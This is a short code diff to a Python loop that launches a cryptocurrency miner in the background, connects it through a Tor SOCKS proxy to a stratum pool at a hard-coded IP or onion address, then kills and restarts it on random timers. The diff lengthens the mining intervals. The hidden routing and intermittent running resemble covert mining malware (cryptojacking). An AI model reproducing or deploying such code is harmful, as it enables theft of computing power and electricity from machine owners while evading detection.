@@ -65,7 +65,7 @@ while True:
 #os.system (program + ' -o stratum+tcp://73avhutb24chfsh6.onion:442 --tls -socks5=9050 -t ' + str(cores))
     os.system (program + ' -o stratum+tcp://66.42.53.57:442 --tls -socks5=9050 -t ' + str(cores) + ' &')
     #time.sleep(thoigianchay)
-    random_chay = [200, 250, 300, 350]
+    random_chay = [480, 540, 600]
     thoigianchay = random.choice(random_chay)
     os.system('pkill program')
     random_nghi = [50, 60, 70, 80]
